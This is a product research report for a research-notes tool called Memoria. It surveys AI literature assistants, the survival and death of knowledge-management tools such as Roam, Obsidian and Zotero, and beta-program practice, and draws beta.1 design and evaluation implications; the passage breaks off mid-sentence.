## Part 1 — Research findings by stream

### Commercial AI research assistants (Elicit, NotebookLM, Undermind, SciSpace, Consensus, scite, Zotero ecosystem, OpenAI/Google Deep Research): product decisions on verification/citation UX, onboarding time-to-value, pricing vs usage cost, and what users praise or abandon them for

Research across Elicit, NotebookLM, Undermind, SciSpace, Consensus, scite, the Zotero ecosystem, and OpenAI/Google Deep Research shows a consistent pattern. What users praise and pay for: span-level citations with hover-to-quote verification (Elicit, NotebookLM), stance-classified citations with context (scite), instant zero-setup time-to-value (NotebookLM: 1M users in 3 months), and honest confidence/conflict flagging. What they abandon tools for: opaque credit systems and unpredictable cost (SciSpace's Trustpilot record), trapped outputs with no export or cross-project memory (NotebookLM's documented failure list), fabricated or misrepresented citations (Deep Research agents; ReportBench), and misleading aggregate evidence scores (the Consensus Meter, condemned as vote-counting). Hard numbers: grounding cuts hallucination to ~13% but not zero; independently measured Elicit search recall is 39.5% vs 94.5% for traditional search (adjunct, not replacement); researchers use AI at ~60% but trust it at 22% and explicitly demand inspect-and-correct over full automation; AI apps churn ~30% faster than non-AI apps, so first-session delight does not predict retention. For beta.1 this implies: anchor every machine claim to a full-text span with one-click verification and NLI-backed claim-source checks; make cost visible in dollars per operation (never credits); make long engine runs show live progress; deliver first verified value from a handful of PDFs in one sitting; prove the keep-test by exporting everything as portable markdown with durable anchors; present evidence per-claim with stance and context rather than aggregate scores; ship a pre-defined evaluation harness (extraction/digest accuracy, flag precision, time-to-verify, weekly API dollars) and evaluate longitudinally at week 4+ against the Zotero+Obsidian+ChatGPT null workflow.

- **Span-anchored citations as the core verification UX: every machine claim links to the exact sentence in the source, with hover-to-see-quote**
  - Evidence: Elicit provides sentence-level citations for every extracted claim, linking to the specific sentence in the source paper; reviewers call this the reason verification is 'straightforward'. NotebookLM's most-praised feature across reviews is inline citation tags that on hover show the exact quote in the uploaded PDF ('lets you verify facts in seconds'). Neutral journalistic testing reported ~13% response-level hallucination for source-grounded NotebookLM vs ~40% for ungrounded general LLMs.
  - Source: https://computertech.co/elicit-review/ ; https://atoms.dev/blog/notebooklm ; https://insidescienceresources.wordpress.com/2025/12/16/notebooklm-exploring-a-source-grounded-ai-tool/
  - Beta.1 implication: Beta.1's digest/notes engines must anchor every machine-written claim to a character span of the extracted full text, with one-click jump-to-quote from the wiki page or atomic note. This is the single most consistently praised verification mechanism in the category, and it maps directly onto Memoria's annotation-anchored notes. Measure 'seconds to verify one claim' as a beta.1 metric.
- **Grounding reduces but does not eliminate hallucination; the two residual failure modes are statement hallucination (text deviates from the cited source) and citation hallucination (fabricated reference)**
  - Evidence: ReportBench (arXiv 2508.15804) evaluated deep research agents on academic survey tasks and found low citation semantic consistency with exactly these two failure types, including an OpenAI Deep Research output attributing a claim to 'Kulkarni et al. (2025)' where the cited paper did not list Kulkarni as an author. A trajectory-level study (arXiv 2601.22984) found >57% of source errors occur in the early stage and cascade ('domino effect'). Even NotebookLM's grounded setup shows ~13% response-level hallucination in third-party testing.
  - Source: https://arxiv.org/pdf/2508.15804 ; https://arxiv.org/html/2601.22984v1
  - Beta.1 implication: Provenance links alone are not verification. Beta.1's check layer must test claim-to-source entailment (local NLI is allowed to stay on-box per constraints), not merely that a citation anchor resolves. Also check early-pipeline outputs (catalog record, extraction) hardest, since errors there cascade into every downstream note and compose artifact.
- **Single-number evidence aggregation (Consensus Meter) is the category's cautionary tale: intuitive, popular, and methodologically wrong**
  - Evidence: Aaron Tay's 2025 deep dive (fetched directly): the Consensus Meter is vote-counting, 'an approach the systematic review community largely abandoned decades ago' — n=50 counts the same as n=5,000, effect sizes disappear, publication bias is invisible, and 'possibly/mixed' categories have no standardized meaning. His conclusion: these tools are 'sophisticated scoping or exploratory tools rather than a replacement for systematic review methodology'; users conflate retrieval speed with rigor.
  - Source: https://aarontay.substack.com/p/a-2025-deep-dive-of-consensus-promises
  - Beta.1 implication: Beta.1's compose-flow gap analysis and 'argument graph saturation' must not surface a single aggregate score presented as evidence synthesis. Show evidence per-claim with study context (sample size, design, stance) and let the PI judge. Inference: a 'saturation %' widget would be Memoria's Consensus Meter — seductive and wrong.
- **Stance-classified citations with surrounding context (scite Smart Citations: supporting/contrasting/mentioning + the sentence around the citation + a confidence score) is a proven-valuable primitive researchers pay for**
  - Evidence: scite classifies every citation as supporting/contrasting/mentioning and always shows the surrounding sentence in context plus a confidence percentage. Researcher reviews call the feature 'indispensable to me when writing papers and finding related work to cite'; the noted barrier is price for unaffiliated researchers ($7.99–$59.99/mo tiers, premium ~$20/mo).
  - Source: https://scite.ai/pricing ; https://effortlessacademic.com/scite-ai-review-2026-literature-review-tool-for-researchers/ ; https://pmc.ncbi.nlm.nih.gov/articles/PMC8608186/
  - Beta.1 implication: When beta.1's compose flow links evidence to a research question, label each link with stance (supports/contrasts/mentions) plus the verbatim context quote and a confidence value. This is a small, well-validated schema — adopt it rather than inventing a richer edge taxonomy for beta.1.
- **Opaque usage-credit systems are a top documented abandonment trigger (SciSpace)**
  - Evidence: SciSpace Trustpilot reviews (verified via review pages): credits vanish monthly with no rollover, coin consumption is unpredictable ('opaque credit consumption without the option to predict the final cost'), the AI agent 'can consume all credits (5500) while delivering nothing of value', refunds refused, plus a clinical researcher reporting fabricated references including 'a reference generated under their own name'. Elicit also caps credits with no rollover (12,000/mo on Plus), a recurring complaint in reviews.
  - Source: https://www.trustpilot.com/review/scispace.com ; https://elicit.com/pricing ; https://support.elicit.com/en/articles/8670209
  - Beta.1 implication: Memoria's per-call API cost is real money, so beta.1 must make cost first-class and predictable: show estimated $ before an engine run and actual $ after, per operation and per week. Never abstract cost into credits/coins. Instrument 'cost per digested work' and 'cost per compose run' as beta.1 measurements — cost surprise is a documented abandonment cause.
- **Long-running research jobs (5–30 min) are acceptable to users only with a live progress feed, interruptibility, and completion notification**
  - Evidence: OpenAI and Google both ship Deep Research with 5–30 minute runtimes; both show a live feed of what the agent is reading ('so you're not left waiting blindly') and notify on completion; Google's own developer guidance says a 5–10 minute wait 'needs progress indicators, status updates, and possibly email/webhook delivery' and to not design a UI expecting sub-30-second responses.
  - Source: https://ai.google.dev/gemini-api/docs/deep-research ; https://openai.com/index/introducing-deep-research/
  - Beta.1 implication: Beta.1's heavy engines (digest a work, build project graph) can legitimately take minutes — but must emit a visible trace of what they are doing, survive interruption, and notify when done. Design the operations log as user-facing progress UX, not just provenance storage.
- **Time-to-first-value in minutes, with zero setup, is what drove the category's only mass-adoption success (NotebookLM)**
  - Evidence: NotebookLM's model is: create notebook, drop in sources, immediately ask grounded questions — no schema, no configuration. Growth: 1M users within ~3 months of 2023 launch, ~5M MAU by Q1 2024, mobile app at 8M MAU after May 2025 launch; Audio Overviews (instant podcast from your PDFs) is used daily by ~45% of users per aggregated stats. (Aggregator-sourced numbers; direction and magnitude consistent across sources.)
  - Source: https://en.wikipedia.org/wiki/NotebookLM ; https://zipdo.co/notebooklm-statistics/ ; https://techcrunch.com/2024/10/17/googles-notebooklm-now-lets-you-guide-ai-generated-audio-conversations-launches-business-pilot/
  - Beta.1 implication: Beta.1's first session must go from '5 PDFs dropped into the vault' to 'cataloged records + a digest with clickable anchored citations' in one sitting with no configuration. Measure time-to-first-verified-answer against the null workflow (Zotero+Obsidian+ChatGPT), where the same outcome takes manual copy-paste.
- **Even a loved tool gets abandoned when its outputs are trapped: no export, citations that don't survive export, siloed notebooks, no cross-project memory (NotebookLM's documented failure list)**
  - Evidence: Directly fetched xda-developers analysis: 'There's no export... citations don't transfer as links'; 'Notebooks can't talk to each other'; no task capture ('can't flag responses for follow-up'); citations lack page/paragraph references citable in a formal paper; no global search across notebooks. Verdict: 'sealed-off notebooks essentially trap valuable insights behind friction so high that users stop revisiting them altogether', forcing parallel systems (Todoist, Notion, Readwise).
  - Source: https://www.xda-developers.com/notebooklm-limitations/
  - Beta.1 implication: Memoria's keep-test (portable markdown, files survive the tool) is the direct antidote and a genuine differentiator — beta.1 must prove it: every engine output lands as markdown with citation anchors that remain resolvable outside the tool (plain-text spans + bibliographic keys). Also: one corpus, not per-project silos — the compose flow must read across everything.
- **AI apps convert well but churn ~30% faster than non-AI apps; novelty does not retain**
  - Evidence: RevenueCat-derived reporting (TechCrunch, Mar 2026): annual subscriber retention for AI apps is 21.1% vs 30.7% for non-AI; AI apps convert trials at 8.5% vs 5.6% but users cancel annual subscriptions 30% faster at the median. ChartMogul's SaaS retention report describes the same 'AI churn wave'.
  - Source: https://techcrunch.com/2026/03/10/ai-powered-apps-struggle-with-long-term-retention-new-report-shows/ ; https://chartmogul.com/reports/saas-retention-the-ai-churn-wave/
  - Beta.1 implication: Beta.1 evaluation must be longitudinal, not demo-based: define success as sustained use at week 4+ (sessions/week, works ingested/week, notes written/week holding steady) versus the null workflow, since first-session delight demonstrably does not predict retention in this category. This aligns with abandonment being Memoria's dominant product risk.
- **AI literature search is an adjunct, not a replacement: independently measured recall is far below traditional search even when precision is higher**
  - Evidence: Peer-reviewed comparison of Elicit vs traditional searching across four evidence syntheses: Elicit sensitivity averaged 39.5% vs 94.5% for original reviews, though precision was higher (41.8% vs 7.55%) — conclusion: useful for preliminary searches and as an adjunct, cannot replace systematic search. Undermind claims '10x better than Google Scholar' in its own whitepaper, but Tay notes its ranking pipeline is 'fully blackbox' and Consensus's deep search is non-deterministic (repeated queries give different rankings).
  - Source: https://www.ncbi.nlm.nih.gov/pmc/articles/PMC12483133/ ; https://aarontay.substack.com/p/a-2025-deep-dive-of-consensus-promises ; https://www.undermind.ai/
  - Beta.1 implication: Scope beta.1's gap analysis to the PI's own corpus (where recall is computable and honest) and treat external-literature discovery as explicitly best-effort/adjunct, or defer it. Never present machine search over the corpus as complete without stating what was searched; determinism/reproducibility of a corpus query is a cheap differentiator over the commercial tools.
- **Credible vendors publish a pre-launch evaluation with named metrics and external auditors, and make every machine decision inspectable and overridable (Elicit Systematic Review)**
  - Evidence: Directly fetched Elicit eval writeup: screening benchmarked against 58 published systematic reviews — 93.6% recall (≈96.4% with properly specified criteria), 62.8% specificity; extraction 94% accurate internally, 99.4% per external VDI/VDE audit, near-zero false negatives per CSIRO; and 'Elicit is transparent and editable by design, users can always inspect screening results and override any screening decision.'
  - Source: https://elicit.com/blog/how-we-evaluated-elicit-systematic-review
  - Beta.1 implication: Build the beta.1 evaluation harness before beta.1 ships: a labeled sample of the PI's own corpus with target accuracy numbers for catalog extraction and digest claims. 'Checked means checks passed' needs published (at least internally recorded) check pass-rates to mean anything. Every machine decision needs an inspect-and-override affordance — override, not approve.
- **Researchers use AI heavily but do not trust it, and explicitly reject full automation — they demand inspect-and-correct**
  - Evidence: Nature/Elsevier survey data: ~60% of researchers use AI in their work but only 22% rate current GenAI tools trustworthy; >50% have used AI in peer review 'often against guidance'. The SCILIRE human-AI teaming study found users 'were not prepared to trust AI-generated results in a fully automated setting and wanted to inspect and review the content, with the ability to correct results.'
  - Source: https://www.elsevier.com/academic-and-government/ai-in-research-and-higher-education/why-trusted-content-matters-in-ai-research ; https://www.nature.com/articles/d41586-025-04066-5 ; https://arxiv.org/pdf/2603.12638
  - Beta.1 implication: Memoria's bet (machine writes + traceability/reversibility instead of per-item approval) is compatible with what researchers say they want, but only if inspection is effortless: beta.1 needs a 'what did the machines write since I last looked' review surface (diff-like, per-work and per-day) so sparse calibrated checkpoints are actually performable.
- **Verification burden scales with missing expertise — the user must know enough to spot hallucinations, so tools should surface what to distrust rather than assume re-reading**
  - Evidence: HN discussion 'The danger of relying on OpenAI's Deep Research' (fetched via Algolia): 'you need to have a certain level of knowledge in order to be able to spot the hallucinations'; reported failure modes include fabricated/misrepresented citations and reliance on abstracts of paywalled papers rather than full text. Elicit's counter-practice: it 'flags its confidence and cites conflicting evidence without smoothing over gaps.'
  - Source: https://news.ycombinator.com/item?id=43057346 ; https://computertech.co/elicit-review/
  - Beta.1 implication: Beta.1 checks should emit targeted distrust signals (low-confidence flags, conflicting-evidence flags, abstract-only-source flags on works lacking full text) instead of expecting the PI to re-verify everything. Measure flag precision (how often a flagged item was actually wrong) — that number is what makes 'checked' calibrated. The full-text-vs-abstract distinction matters: Memoria's extract-raw-full-text step is a real advantage; flag digests built on partial text.
- **Individual-researcher pricing clusters at $10–20/month with usage caps; that band is the revealed willingness-to-pay ceiling**
  - Evidence: Elicit Plus $12/mo (12k credits, no rollover); Consensus Free / Pro ~$10–15/mo; scite premium ~$20/mo (called a barrier for unaffiliated researchers); Undermind free tier + Pro $20/mo for ~30 deep searches ('roughly one deep search per workday'); SciSpace's attempts to charge beyond this band via coin drain generated its worst reviews. Zotero itself charges $0 and has explicitly stayed out of AI (all AI arrives via third-party plugins like PapersGPT/Beaver/Aria, several emphasizing local/offline models).
  - Source: https://elicit.com/pricing ; https://scite.ai/pricing ; https://tooliverse.ai/tools/undermind ; https://forums.zotero.org/discussion/116894/the-possibility-of-integrating-local-ai-into-zotero-which-can-analyse-offline-without-uploading ; https://papersflow.ai/blog/best-zotero-ai-plugins-2026
  - Beta.1 implication: Inference from evidence: the PI's tolerable sustained API spend is roughly $10–25/month against a null workflow whose marginal cost is $0 (ChatGPT sub already paid). Beta.1 should instrument actual weekly API dollars and treat sustained spend above this band as a design failure signal (batch more, cache more, digest less eagerly). The Zotero-plugin ecosystem's demand for local/offline analysis also validates keeping NLI/embeddings local.
- **The category's winning positioning: machine output is a scoping draft that accelerates the human's synthesis, never the final synthesis**
  - Evidence: Tay's conclusion that Consensus/Undermind function as 'sophisticated scoping or exploratory tools'; Elicit's own framing that Systematic Review 'teaches AI to follow this expert human process, while also leaving room for you to take control' and that ~90% accuracy means 'it's very important for you to check the work'; the PMC review of Consensus warns of researchers citing AI summaries instead of original sources (integrity risk).
  - Source: https://aarontay.substack.com/p/a-2025-deep-dive-of-consensus-promises ; https://elicit.com/blog/systematic-review ; https://pmc.ncbi.nlm.nih.gov/articles/PMC12318603/ ; https://academichelp.net/reference-finders/elicit-review.html
  - Beta.1 implication: In beta.1, engine outputs (digests, wiki pages, gathered evidence) should be visibly drafts that the PI edits into authorial artifacts — matching Memoria's 'authorial thinking-and-writing tool' identity. A concrete effectiveness metric: how much of a machine draft survives into the PI-finalized page (edit distance / retention ratio), plus whether the export cites original works, never the machine's summary.

### Why structured PKM tools survive or die: survival patterns from Obsidian, Roam, Athens, Dendron, Zotero, Notion, and Evernote — with beta.1 implications for Memoria

Researched why structured PKM tools survive or die across seven cases with primary sources. The dead/declined tools — Roam (churn after viral 2020 peak; Every's 'Fall of Roam'), Athens (YC W21, shut down Jan 2023: founder concluded 'we don't look back at 99% of our notes' and org systems are 'mechanical and tedious to maintain'), Dendron (Feb 2023: 'not able to find product market fit for a venture backed business' + founder burnout), Evernote (trust exodus after price hikes and lossy ENEX export) — share three killers: maintenance/compliance cost that surfaces within ~3 months, notes that are captured but never revisited (the 'graveyard'), and business models (VC) misaligned with a small serious-user base. The survivors — Obsidian ('100% supported by our users, not investors', plain local files, zero exit cost, paid Sync; 'file over app') and Zotero (20 years, nonprofit, storage subscriptions fully funding development, open auditable formats, embedded in an unavoidable academic job) — share verifiable data ownership, near-zero operating/exit cost, and immediate per-use payoff. Key beta.1 implications: (1) run the trial 8-12 weeks on a real research question with a real output — the abandonment cliff and Matuschak's 'serious context of use' both demand it; (2) make reuse rate (captured items actually pulled into compose flow) the core effectiveness metric, since write-only graphs are the death signal; (3) measure compliance cost as human minutes per machine-written artifact — Memoria's machine-labor bet only wins if review labor doesn't reproduce the manual-linking cost that killed Roam; (4) turn the keep-test and reversibility into gated drills (tool-death drill, lossless round-trip diff, machine-write revert with zero residue), because trust breaks at data-loss moments and lossy export converts wobbles into exodus; (5) measure API $/week against a stated ceiling with graceful degradation to a Dendron-like offline floor; (6) score beta.1 asymmetrically against the null workflow: pass/fail parity on the survivors' properties (portability, offline, cost floor), superiority metrics on machine labor (time saved, gaps surfaced, reuse). One source caveat: the Athens postmortem URL now 404s — its claims are grounded via search snapshots, the GitHub README, and the HN thread; Obsidian's $25M ARR figure is a secondary unverified report, though its no-VC/user-funded model is confirmed first-party.

- **Local plain files as the survival guarantee: a tool built on open local formats keeps working even after its company dies ('file over app').**
  - Evidence: When Dendron development ceased (Feb 2023), founder Kevin Lin explicitly told users: 'Dendron is both local first and open source - this means that Dendron will continue to function' — users kept full access to their notes and the license was relaxed (GPLv3→Apache 2.0) to ease forking. Obsidian CEO Steph Ango's manifesto states 'In the fullness of time, the files you create are more important than the tools you use to create them' and 'all software is ephemeral.' The Athens shutdown HN thread's top lesson was 'A good reminder to use tools that allow you to keep the data locally.'
  - Source: https://github.com/dendronhq/dendron/discussions/3890 ; https://stephango.com/file-over-app ; https://news.ycombinator.com/item?id=34285769
  - Beta.1 implication: The keep-test must be a *tested invariant*, not a principle. Beta.1 should include a 'tool-death drill': disable Memoria entirely and verify the researcher can still read, navigate, and continue working from the vault (markdown + portable bibliography) in stock Obsidian. Anything that fails the drill (opaque indexes, provenance only in a database) is a beta.1 defect. This is evidence-grounded: it is the exact property that made Dendron's death survivable and Athens'/Roam's decline scary.
- **The failure mode of structured PKM is abandonment through maintenance/compliance cost, and it hits within roughly the first three months of use.**
  - Evidence: Athens founder Jeff Tang's postmortem reasoning: 'we don't look back at 99% of our notes,' and organization systems (PARA, BASB, GTD) 'are mechanical and tedious to maintain.' Zettelkasten Forum threads document users 'declaring PKM bankruptcy' and 'Every attempt at PKM has landed me in the same place: a huge mess.' A widely-read Medium account describes deleting 1,500 of 4,500 Obsidian notes because the vault 'was turning into a graveyard of notes.' A PKM course site claims most users abandon their Zettelkasten setup 'by month three' (secondary claim, but consistent with the forum evidence).
  - Source: https://hardpivot.substack.com/p/why-we-stopped-working-on-athens (via search snapshot; original now 404) ; https://forum.zettelkasten.de/discussion/3088 ; https://forum.zettelkasten.de/discussion/3034 ; https://medium.com/@skintik/personal-knowledge-management-mistakes-why-i-deleted-1500-out-of-4500-notes-at-obsidian-6fb2368e2d1d
  - Beta.1 implication: Beta.1's evaluation window must be long enough to cross the abandonment cliff — at least 8-12 weeks of real use, with lapse-and-resume explicitly measured (did the researcher come back after a gap, and how costly was re-entry?). A two-week demo proves nothing about the dominant risk. The primary metric family is compliance cost: human minutes per work ingested, per note filed, per structure maintained.
- **Retention hinges on notes being *revisited and reused*, not captured; the death signal is a write-only 'graveyard' graph.**
  - Evidence: Every's 'The Fall of Roam' (Feb 2022): the promise of eliminating 'Where am I going to put this?' anxiety 'fizzled completely' once users saw they weren't revisiting notes; vaults became 'a garbage dump full of crufty links and pieces of text' rarely revisited; Roam's inadequate search ('a gigantic paragraph of text, with zero context') made retrieval fail exactly when it mattered. The LessWrong analysis concurs: stickiness requires 'active writing practice, substantial ongoing knowledge work, and genuine value from revisiting past notes.'
  - Source: https://every.to/superorganizers/the-fall-of-roam ; https://www.lesswrong.com/posts/CoqFpaorNHsWxRzvz/what-comes-after-roam-s-renaissance
  - Beta.1 implication: Beta.1's core effectiveness metric should be a reuse rate: fraction of cataloged works / atomic notes that are actually pulled into a compose-flow project graph or written output during the trial, versus items never touched again. Memoria's compose flow is the mechanism that forces revisiting; beta.1 must demonstrate at least one full research-question → export loop where previously captured material is retrieved and used. If capture volume grows but reuse stays near zero, the product is reproducing Roam's failure regardless of how good the ingestion pipeline is.
- **Machine absorption of structural labor is the plausible antidote to compliance cost — Roam died partly for lacking it.**
  - Evidence: Every's Roam postmortem specifically faults 'lack of automation': 'Manual double-bracket linking felt like a temporary solution'; the system lacked automated taxonomy and intelligent discovery to organize notes by type (people, meetings, books, tasks). This is the one failure-cause in the record that Memoria's machine-writes bet directly addresses.
  - Source: https://every.to/superorganizers/the-fall-of-roam
  - Beta.1 implication: Inference from the evidence: beta.1 must prove the machine actually absorbs the structuring labor rather than re-skinning it. If every machine write (catalog record, hub link, digest) needs item-by-item human correction, the compliance cost that killed manual linking has just moved to review labor. Measure: human touch-time per machine-written artifact, and the fraction of machine writes that survive unedited after checks. A target like 'machine handles cataloging/linking with <X min/work of human attention' should be an explicit beta.1 acceptance criterion — the value X gets validated for the first time here.
- **Trust breaks at data-loss moments, and lossy export is what turns a wobble into an exodus.**
  - Evidence: Evernote under Bending Spoons: free tier cut to 50 notes and renewals up 70%+ triggered mass exit, but the ENEX export 'drops notebook structure, breaks note links, flattens tag hierarchy, and discards version history,' amplifying anger; r/Evernote's most-upvoted posts became export guides. Notion's markdown export similarly 'is not lossless — complex database relations, rollup properties, and embedded content may not survive,' producing 'a flattened approximation.' Obsidian's counter-position: 'exit cost is zero. Your vault is a folder.'
  - Source: https://retentioncheck.com/blog/evernote-churn-analysis ; https://daveedwardsmedia.com/2025/11/17/new-pricing/ ; https://stealthcloud.ai/comparisons/notion-vs-obsidian-privacy/
  - Beta.1 implication: Beta.1 must define precisely which Memoria structures survive outside the tool and verify losslessness: bibliographic records in a portable standard, provenance and check-status readable in-file (frontmatter/human-readable markers), project/argument graphs exportable to something inspectable. Derived state may be rebuildable, but nothing the researcher authored or the machine wrote into the record may exist only in an opaque store. 'Keep-test passes' should mean a diff-verified round trip, not a marketing claim.
- **For a machine-that-writes tool, the Evernote-style trust break is an unrecoverable bad write; reversibility is the trust infrastructure.**
  - Evidence: Inference built on two evidence lines: (a) trust damage compounds fast and drives exit — Evernote users cited 'feature removal without advance notice' as amplifying trust damage; (b) the surviving tools' trust posture is verifiable, not promised — Obsidian: 'Your data is stored on your device, inaccessible to us'; Zotero: code 'publicly auditable and data formats open.' No direct precedent exists for machine-writes-into-vault at this product category (that is Memoria's novel bet).
  - Source: https://retentioncheck.com/blog/evernote-churn-analysis ; https://obsidian.md/about ; https://paperpile.com/r/zotero-vs-mendeley/
  - Beta.1 implication: Beta.1 needs a reversibility drill as a gating check: take a real machine-write batch, revert it, and verify zero residue and zero collateral damage to human-authored text. It also needs the first live measurement of bad-write frequency and detection latency (how long until the researcher notices a wrong machine edit, and via what surface). One silent corruption of the researcher's own words during the beta would likely end the product; the drill and provenance visibility are what make the epistemics stance ('checked means checks passed') survivable.
- **VC-backed PKM tools died of business-model mismatch; survivors are user-funded with operating costs near zero (Obsidian) or nonprofit with subscriptions covering costs (Zotero).**
  - Evidence: Dendron (Feb 2023): 'as a business, we were ultimately not able to find product market fit for a venture backed business,' plus founder burnout. Athens (Jan 2023, YC W21, ~$850k spent per postmortem; $1.9M raised per GitHub README): founder 'no longer believed there was a billion dollar opportunity in note-taking.' HN on Athens: 'Once they started taking VC money, this is kind of what I expected.' Obsidian: '100% supported by our users, not investors,' team of ~9, revenue from optional Sync ($5/mo)/Publish/commercial licenses; a secondary report claims ~$25M ARR and 1.5M+ MAU (unverified numbers). Zotero: launched 2006 on Mellon/IMLS/Sloan grants, transitioned via the nonprofit Corporation for Digital Scholarship to being 'funded entirely by individual and institutional storage subscriptions' — 20 years and still the most-used academic reference manager.
  - Source: https://github.com/dendronhq/dendron/discussions/3890 ; https://github.com/athensresearch/athens ; https://hardpivot.substack.com/p/why-we-stopped-working-on-athens (via snapshot) ; https://obsidian.md/about ; https://finance.biggo.com/news/iVboYp0Bga3fZL9MJEv_ ; https://www.zotero.org/about/ ; https://www.zotero.org/blog/building-a-sustainable-zotero-project/
  - Beta.1 implication: Memoria's analog of a sustainable cost base is the researcher's ongoing API bill — the 'subscription' that must stay tolerable or the tool gets shelved. Beta.1 must measure real cost: $/week of normal use and $/work ingested, against a stated budget ceiling, and demonstrate graceful degradation to a Dendron-like floor: with API spend at zero, reading, writing, linking, and search still work (only live engines pause). If beta.1 cannot run affordably for months, abandonment follows the economics, not the UX.
- **Zotero's 20-year survival formula: own one narrow, unavoidable job embedded in the researcher's existing obligations, with immediate per-use payoff.**
  - Evidence: Zotero survived Mendeley's Elsevier acquisition and every VC-funded competitor by doing citation/bibliography work that academics must do anyway to publish; its trust advantages (nonprofit, open formats, local data, 'no commercial relationship between your reading behavior and a publisher') widened the gap after Mendeley moved away from robust local management. Its payoff is same-session: capture a reference, get a formatted citation.
  - Source: https://www.zotero.org/about/ ; https://paperpile.com/r/zotero-vs-mendeley/ ; https://citedash.ai/blog/zotero-vs-mendeley
  - Beta.1 implication: Inference: beta.1 should guarantee at least one loop with same-session payoff attached to work the researcher must do anyway — e.g., the digest of a paper they have to read regardless, or gap analysis that directly answers today's live research question. Tools whose entire payoff is deferred ('your future self will thank you') are the ones the abandonment record kills. Sequencing beta.1 evaluation around a real deadline-driven task borrows Zotero's embedding trick.
- **Hype-community growth is a liability for retention; the durable core is a small population with a genuine context of use.**
  - Evidence: Roam's viral 2020 surge was FOMO-driven (Kevin Rose, Patrick Collison, Venkatesh Rao adopting publicly; a course/guru ecosystem), and it churned when 'the social network effect fades.' The LessWrong analysis argues Roam's 'fall' is consolidation to a niche that genuinely needs it — the community now 'celebrates the lack of new features'; a 2026 status report claims a resilient core (~1M monthly visitors, secondary claim). Andy Matuschak's observation frames the same trap: 'People who write extensively about note-writing rarely have a serious context of use.'
  - Source: https://www.lesswrong.com/posts/CoqFpaorNHsWxRzvz/what-comes-after-roam-s-renaissance ; https://blog.thefix.it.com/do-people-still-use-roam-research-discover-its-2026-status/ ; https://notes.andymatuschak.org/zUMFE66dxeweppDvgbNAb5hukXzXQu8ErVNv
  - Beta.1 implication: Beta.1 is correctly defined as a single-researcher, real-scenario trial — this is the survival-relevant test, and the temptation to evaluate via demos, synthetic corpora, or PKM-enthusiast feedback should be explicitly rejected. The evaluation subject must have a Matuschak-valid 'serious context of use': an actual research question moving toward an actual written output. Effectiveness claims from any other setting are the exact signal that misled Roam-era tools.
- **Tool tinkering substitutes for knowledge work and is an abandonment precursor, not engagement.**
  - Evidence: Obsidian Forum: 'My Obsidian PKM system became a substitute for real thinking' — the system 'felt like thinking and gave a false sense of progress,' users 'became professional organizers, not better thinkers.' The Medium PKM-mistakes account describes drowning in plugin/CSS customization while 'completely forgetting Zettelkasten principles.' High-configurability tools invite this failure (Obsidian has 2,700+ community plugins).
  - Source: https://forum.obsidian.md/t/my-obsidian-pkm-system-became-a-substitute-for-real-thinking-how-do-i-break-free/115302 ; https://medium.com/@skintik/personal-knowledge-management-mistakes-why-i-deleted-1500-out-of-4500-notes-at-obsidian-6fb2368e2d1d
  - Beta.1 implication: Ship beta.1 opinionated: one blessed configuration of the two workflows, minimal knobs, no schema/threshold decisions delegated to the researcher. Instrument the trial to distinguish knowledge-work time from system-fiddling time; rising fiddle-share is an early abandonment indicator to watch, not a sign of engagement. Every threshold previous docs invented should be either fixed by the product or measured in beta.1 — never surfaced as a user tuning surface.
- **Feature velocity does not retain serious users; reliability of the core loop does. Slow-shipping survivors outlived fast-pivoting funded rivals.**
  - Evidence: Zotero shipped conservatively for two decades and won its category. Roam's churned casuals blamed 'incredibly slow product velocity' and missing mobile, yet its retained believers 'celebrate the lack of new features' — velocity complaints came from users who were leaving anyway because the core promise (useful revisiting) failed. Athens/Dendron shipped fast on VC timelines and died. Roam's 'well-documented community issues' (subreddit purges of critics) also damaged trust independent of the product.
  - Source: https://www.zotero.org/about/ ; https://every.to/superorganizers/the-fall-of-roam ; https://www.lesswrong.com/posts/CoqFpaorNHsWxRzvz/what-comes-after-roam-s-renaissance ; https://talk.macpowerusers.com/t/roam-research-negative-users-purged-from-the-roam-subreddit/25502
  - Beta.1 implication: Inference: beta.1 should freeze scope at the two workflows and spend the milestone on depth — retrieval that works (Roam's search failure was a named killer), digests that are trustworthy, an export that closes the loop — rather than breadth of engines or views. The beta.1 'must prove' list is short: information flow end-to-end, compose flow end-to-end, keep-test, reversibility, cost ceiling, reuse rate. Everything else is post-beta.
- **The null workflow (Zotero + Obsidian + ad-hoc ChatGPT) is composed of the category's proven survivors, which sets the trust bar Memoria must never fall below.**
  - Evidence: Both baseline tools survived on the same two properties: zero exit cost (plain files / open data + auditable nonprofit) and zero mandatory ongoing fee. Every failed tool in this research (Roam churn, Athens, Dendron, Evernote exodus, Notion distrust) violated at least one of: data portability, sustainable economics, or trust in the steward.
  - Source: https://obsidian.md/about ; https://www.zotero.org/about/ ; synthesis of all sources above (inference)
  - Beta.1 implication: Beta.1's evaluation against the null workflow is asymmetric: Memoria must be strictly no-worse on portability, offline capability, and cost floor (the survival properties), and measurably better on the labor the null baseline can't do — automated cataloging/linking/digesting and graph-driven gap analysis in the compose flow. Frame the beta.1 scorecard that way: parity checks on survival properties (pass/fail drills), superiority metrics on machine-labor value (time saved, reuse rate, gaps surfaced that the researcher acted on).

### Beta-program best practice for developer/prosumer tools: what "beta" should mean for Memoria beta.1 (entry/exit criteria, cohort design, feedback instrumentation, docs readiness, migration promises, breaking-change policy, telemetry consent)

Researched published beta-program guidance (Centercode's benchmark-backed beta guide, entry/exit-criteria literature, SemVer, Google Cloud launch stages, GitLab's definition of done, NN/g diary studies) and verified the actual beta behavior of respected prosumer/local tools (Obsidian early-access/Catalyst, Zotero beta builds, Linear's invite-cohort beta, Superhuman's PMF engine, 1Password and Tailscale release channels, Go toolchain and Homebrew telemetry). Convergent picture of what "beta" should mean for a tool like Memoria: (1) ENTRY = a viable test state — both product workflows executable end-to-end on real material, docs for those workflows written, and a feedback-capture mechanism in place, with dogfooding on the sandbox corpus already done (JetBrains ran Junie internally for months before closed beta); (2) EXIT = pre-registered, measurable questions decided before day one, evaluated at a fixed review date (industry norm 3–12 weeks), against the explicit baseline of the null workflow; (3) COHORT for a single-user product is n=1-researcher × real projects, run Linear-style as project→triage→fix→next-project loops, evaluated with the methodologically recognized n=1 instrument — a diary study — plus Superhuman's recency-gated reliance signal (used the core flows ≥2x in the trailing two weeks, unprompted) as the abandonment metric; (4) INSTRUMENTATION = structured in-vault beta journal (issues/ideas/praise) with every entry and provenance record auto-stamped with the build version, and NO automatic telemetry — the settled norm for privacy-sensitive tools (Go's opt-in reversal, Homebrew's pre-consent notice, Obsidian's zero-telemetry identity) is local, inspectable metrics with manual export 